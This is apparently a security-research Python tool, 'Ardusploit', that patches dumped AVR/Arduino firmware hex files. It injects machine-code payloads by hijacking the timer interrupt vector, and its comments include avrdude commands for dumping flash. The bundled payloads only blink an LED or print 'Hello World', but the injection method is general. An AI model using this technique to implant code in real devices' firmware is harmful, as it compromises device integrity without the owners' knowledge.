#!/usr/bin/python

#
# Ardusploit
# written by Cesare Pizzi
#
# Automate code injection for AVR MCU
#
# $Id: ardusploit.py,v 2.13 2018/06/17 09:02:21 cesare Exp cesare $
#
# Notes:
#
# Dump code examples:
#       /opt/arduino-1.8.5/hardware/tools/avr/bin/avrdude -C/opt/arduino-1.8.5/hardware/tools/avr/etc/avrdude.conf -q -patmega328p -carduino -P/dev/ttyACM0 -b115200 -D -Uflash:r:/tmp/flash.hex:i
#       /opt/arduino-1.8.5/hardware/tools/avr/bin/avrdude -C/opt/arduino-1.8.5/hardware/tools/avr/etc/avrdude.conf -q -patmega32u4 -cavr109 -P/dev/ttyACM0 -b57600 -D -Uflash:r:/tmp/flash.hex:i
#       /opt/arduino-1.8.5/hardware/tools/avr/bin/avrdude -C/opt/arduino-1.8.5/hardware/tools/avr/etc/avrdude.conf -q -patmega2560 -cwiring -P/dev/ttyUSB0 -b115200 -D -Uflash:r:/tmp/flash.hex:i
#

import traceback
import re
import sys
import getopt
import itertools
from termcolor import colored
from intelhex import IntelHex
from binascii import unhexlify
from bitstring import BitArray, BitStream

######################################################################################
# START of customizable section
######################################################################################

debug = 0

# Define MCU
mcu = 'atmega328p'

# Define payload type
payloadType = 'blink'

# Define insert point
# insertPointFlag = '80933401'     # atmega32u4
# insertPointFlag = '1092C100'     # atmega2560
insertPointFlag = '1092C100'       # atmega328p

# Init code
# Initiates the timer interrupt
initcode = '1F920F920FB60F928F939F93EF93FF93F89410928000E1E8F0E01082109285001092840082E19AE79093890080938800808188608083808184608083EFE6F0E08081826080837894FF91EF919F918F910F900FBE0F901F90'

# Payload. Must ends with RETI (opcode 1895)

payloadDictionary_blink = {
	# Blink 0.1sec payload for atmega328p
	'atmega328p': '1F920F920FB60F9211242F933F934F935F938F939F93AF93BF93EF93FF93259A80E092EEA4E0B0E02B2F4A2F592F2D9A81509040A040E0F72D98215030404040E0F7FF91EF91BF91AF919F918F915F914F913F912F910F900FBE0F901F901895',

	# Blink 0.1sec payload for atmega32u4
	'atmega32u4': '1F920F920FB60F9211242F933F934F935F938F939F93AF93BF93EF93FF933F9A479A8FEF91EE24E0815090402040E1F700C088B118B88FEF91EE24E0815090402040E1F700C0FF91EF91BF91AF919F918F915F914F913F912F910F900FBE0F901F901895',
	# Blink 0.1sec payload for atmega2560
	'atmega2560': '1F920F920FB60F9211242F933F934F935F938F939F93AF93BF93EF93FF93279A84B58F7784BD2F9A2FEF81EE94E0215080409040E1F700C084B58F7784BD2F982FEF81EE94E0215080409040E1F700C0FF91EF91BF91AF919F918F915F914F913F912F910F900FBE0F901F901895'
}

payloadDictionary_hello = {
	# "Hello World" payload for atmega328p. Assumes port at 115200 baud, does not initialize it
	'atmega328p': '0F922F933F938F939F9388E420E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F785E620E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F78CE620E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F78CE620E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F78FE620E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F780E220E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F787E520E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F78FE620E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F782E720E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F78CE620E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F784E620E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F78AE020E03CE2F894519A59980BB093E0232F2A95F1F780FB01F8969587950BB8B9F79F918F913F912F910F901895',
}

######################################################################################
# END of customizable section
######################################################################################


def injectHex(ifile, verbose, dryrun, payloadAddr, initPayloadAddr):

	global initcode, payloadDictionary, mcu, payloadType

	i = 0
	prog = ''
	addr = 0
	payloadPos = 999999
	initcodePos = 999999
	initcodeLen = 0
	payloadLen = 0
	isrJmp = 0
	timerUsed = False

	# Read the proper payload from dictionary
	if ( payloadType == 'blink'):
		payload = payloadDictionary_blink[mcu]
	if ( payloadType == 'hello'):
		payload = payloadDictionary_hello[mcu]

	# Line format
	hexLineReg = '^:(.{2})(.{4})(.{2})(.*)(.{2})$'

	# Open hex file
	with open(ifile) as hexFile:
		for line in hexFile:
			try:
				line = line.rstrip('\r\n')
				if verbose == 1:
					print colored(':','grey'),
					print colored(re.match(hexLineReg, line).group(1),'blue'),
					print colored(re.match(hexLineReg, line).group(2),'green'),
					print colored(re.match(hexLineReg, line).group(3),'white'),
					print colored(re.match(hexLineReg, line).group(4),'red'),
					print colored(re.match(hexLineReg, line).group(5),'yellow'),
					print

				prog = prog + re.match(hexLineReg, line).group(4)

			except:
				print '*** Error handling line: ' + line
				traceback.print_exc()

	#
	# Insert the payload
	#

	if dryrun != 0:
		print '[+] Dry run, no modification applied to output file (just formatting)'

	# Find and save the ISR address
	print '[+] Finding entry points'

	if mcu == 'atmega328p' or mcu == 'atmega168':
		isrJmp = 92               #  prog[88:96]
	elif mcu == 'atmega32u4':
		isrJmp = 140              #  prog[136:144]
	elif mcu == 'atmega1280':
		isrJmp = 140              #  prog[136:144]
	elif mcu == 'atmega2560':
		isrJmp = 136              #  In this case, a rjmp instead of jmp is used, prog[136:144]

	# Check if the timer vector is already used
	if isTimerUsed(isrJmp,prog,mcu) == False:
		print '[+] Timer vector not used'
		timerUsed = False
	else:
		print '[+] Timer vector is in use...try to append'
		timerUsed = True

		# Save the current address of ISR
		if mcu == 'atmega2560':
			# Get the relative address
			isrOriginal = timerAddr(isrJmp,prog,mcu)
		else:
			# Get the absolute address
			isrOriginal = prog[isrJmp:isrJmp + 4]

		# Modify payload, removing RETI and adding JMP
		payload = payload[:len(payload) - 4] + '0C94' + isrOriginal

	insertPoint = prog.find(insertPointFlag,int(prog[6:8] + prog[4:6],16) * 2 )
	# FIXME: find a proper couple of instruction to overwrite

	if insertPoint == -1 and timerUsed == False:
		# Exit if no entry point is found and if the timer vector is not used
		print '[-] No entry point found, try different insert-flag'
		sys.exit(1)

	# Save the opcode that will be overwritten
	saveOpcode = prog[insertPoint + 8:insertPoint + 16]
	jmp = BitArray('uintle:16=' + str((insertPoint + 16 ) / 4 ))

	# Prepare the code for injection
	initcode = initcode + saveOpcode + '0C94' + jmp.hex

	# Find the place to inject the code. Look for (hopefully) unused space
	# at least look for 64 * F
	print '[+] Inserting payload'
	initcodeLen = len(initcode)
	if initcodeLen < 64:
		initcodeLen=64
		initcode = initcode.ljust(64,'F')

	payloadLen = len(payload)
	if payloadLen < 64:
		payloadLen = 64
		payload = payload.ljust(64,'F')

	# Injecting payload (ISR routine) aligned at WORD
	i = len(prog)
	# The ISR routine must be in the first 128K, I force the value or the first segment
	if i > 60000:
		i = 60000

	if payloadAddr == 0:
		# If not specified at command line, find the position
		while ( payloadPos % 4 ) != 0:
			payloadPos = prog.rfind("F" * payloadLen,0,i)
			i = i - 1
	else:
		# If it has been specified at command line, use the value
		payloadPos = payloadAddr * 2

	if dryrun == 0:
		prog = prog[:payloadPos] + payload + prog[payloadPos + payloadLen:]

	# Injecting init code aligned at WORD
	i = len(prog)
	if mcu == 'atmega2560' or mcu == 'atmega1280':
		# The ISR routine must be in the first 128K, I force the value or the first segment
		i = 60000

	if initPayloadAddr == 0:
		# If not specified at command line, find the position
		while ( initcodePos % 4 ) != 0:
			initcodePos = prog.rfind("F" * initcodeLen,0,i)
			i = i - 1
	else:
		# If it has been specified at command line, use the value
		initcodePos = initPayloadAddr * 2

	if dryrun == 0:
		if timerUsed == False:
			prog = prog[:initcodePos] + initcode + prog[initcodePos + initcodeLen:]

	if ( initcodePos > 0 or timerUsed == True ) and payloadPos > 0:

		# Fix addresses
		fixedAddrInit = BitArray('uintle:16=' + str(initcodePos / 4))
		fixedAddrPayload = BitArray('uintle:16=' + str(payloadPos / 4))
		if dryrun == 0:
			if timerUsed == False:
				if mcu == 'atmega2560':
					prog = prog[:isrJmp] + '0C94' + fixedAddrPayload.hex + prog[isrJmp + 8:insertPoint + 8] + '0C94' + fixedAddrInit.hex + prog[insertPoint + 16:]
				else:
					prog = prog[:isrJmp] + fixedAddrPayload.hex + prog[isrJmp + 4:insertPoint + 8] + '0C94' + fixedAddrInit.hex + prog[insertPoint + 16:]
			else:
				if mcu == 'atmega2560':
					# Do not modify the entry point, just rely on existing ISR initialization
					prog = prog[:isrJmp] + '0C94' + fixedAddrPayload.hex + prog[isrJmp + 8:]
				else:
					# Do not modify the entry point, just rely on existing ISR initialization
					prog = prog[:isrJmp] + fixedAddrPayload.hex + prog[isrJmp + 4:]

		# Save the hex file
		print '[+] Saving injected file'
		outfile = open(ifile + '.injected', 'w')
		ih = IntelHex()

		for line in re.findall('.{32}',prog):
			ih.puts(addr,unhexlify(line))
			addr = addr + 16

		ih.write_hex_file(outfile)

	else:
		print '[-] No space to inject code'

#
# Check if Timer interrupt is already used
#
def isTimerUsed(vectorJmp,prog,mcu):

	# Find instruction pointed by the vector address
	p = BitArray('0x' + prog[vectorJmp:vectorJmp+4])
	p.byteswap()        # Correct endianess

	if mcu == 'atmega2560':
		# ATMEGA2560 uses rjmp, so requires specific check
		b = BitArray(p)
		# Get the offset of rjmp
		offset = re.match('110[10](............)',b.bin).group(1)
		o = BitArray('bin:12=' + offset)
		# Read the instruction at offset
		i = vectorJmp  + (o.int * 4) + 4
		opcode = prog[i+2:i+4] + prog[i:i+2]
		# Get again the offset of the rjmp
		b = BitArray('0x' + opcode)
		offset = re.match('110[10](............)',b.bin)
		if offset:
			o = BitArray('bin:12=' + offset.group(1))
			# Check if the jmp go back to 0, if so the vector is not used
			if ( abs(o.int * 4) ) - ( i + 4 ) == 0:
				return False
	else:
		# Extract the opcode
		opcode = prog[p.int*4:(p.int+2)*4]

		# Check if pointed opcode is 0C940000 (JMP 0), if so the vector is not used
		if opcode == '0C940000':
			return False

	return True

#
# Get ISR address in case of RJMP (atmega2560)
#
def timerAddr(vectorJmp,prog,mcu):

	# Find instruction pointed by the vector address
	p = BitArray('0x' + prog[vectorJmp:vectorJmp+4])
	p.byteswap()        # Correct endianess

	# ATMEGA2560 uses rjmp, so requires specific check
	b = BitArray(p)
	# Get the offset of rjmp
	offset = re.match('110[10](............)',b.bin).group(1)
	o = BitArray('bin:12=' + offset)
	# Compute the address
	i = ( vectorJmp  + (o.int * 4) + 4 ) / 4
	f = BitArray('int:16=' + str(i))
	f.byteswap()       # Correct endianess

	return f.hex

#
# Main function
#
def main(argv):

	global mcu, insertPointFlag, payloadType

	inputfile = ''
	verbose = 0
	dryrun = 0
	payloadAddr = '0x00'
	initPayloadAddr = '0x00'

	# Check the command line options
	try:
		opts, args = getopt.getopt(argv,"?hdf:vm:i:p:P:t:",["dry-run","ifile=","verbose","mcu=","insert-flag=","payload-addr=","init-payload-addr=","type="])
	except getopt.GetoptError:
		print 'ardusploit.py -?       to get some help'
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h' or opt == '-?':
			print '   ___          __              __     _ __ '
  			print '  / _ | _______/ /_ _____ ___  / /__  (_) /_'
			print ' / __ |/ __/ _  / // (_-</ _ \/ / _ \/ / __/'
			print '/_/ |_/_/  \_,_/\_,_/___/ .__/_/\___/_/\__/ '
			print '                       /_/                  '
			print

			print 'ardusploit.py -f <inputfile>'
			print '              -v verbose output'
			print '              -d dry-run, do not apply any modification'
			print '              -m specify MCU to work with (default: ' + mcu + ')'
			print '              -t type of payload to inject (default: ' + payloadType + ')'
			print '              -i insert-flag, the instructions after which inject the code'
			print '              -p hex payload address, no validation will be performed'
			print '                 (automatically computed if omitted)'
			print '              -P hex init payload address, no validation will be performed'
			print '                 (automatically computed if omitted)'
			sys.exit()
		elif opt in ("-f", "--file"):
			inputfile = arg
		elif opt in ("-v", "--verbose"):
			verbose = 1
		elif opt in ("-d", "--dry-run"):
			dryrun = 1
		elif opt in ("-m", "--mcu"):
			mcu = arg
		elif opt in ("-i", "--insert-flag"):
			insertPointFlag = arg
		elif opt in ("-t", "--type"):
			payloadType = arg
		elif opt in ("-p", "--payload-addr"):
			payloadAddr = arg
		elif opt in ("-P", "--init-payload-addr"):
			initPayloadAddr = arg

	# Validate and process the parameters
	if mcu not in ['atmega328p', 'atmega168','atmega2560', 'atmega1280', 'atmega32u4']:
		# Not a valid MCU
		print '[-] MCU not supported'
		inputfile = ''
	if payloadType not in ['blink', 'hello']:
		# Not a valid payload selected
		print '[-] Payload type not supported'
		inputfile = ''
	if ( len(insertPointFlag) % 4 != 0 ):
		# Insert point opcodes must be aligned
		print '[-] Insert Flag must be divisible by 4 for alignement'
		inputfile = ''

	if inputfile:
		print '[+] Running for MCU: ' + mcu + ' - Payload: ' + payloadType + ' - Insert-flag: ' + insertPointFlag
		injectHex(inputfile,verbose,dryrun,int(payloadAddr,16),int(initPayloadAddr,16))
	else:
		print '[-] ...nothing to do...exiting'

if __name__ == "__main__":
	main(sys.argv[1:])
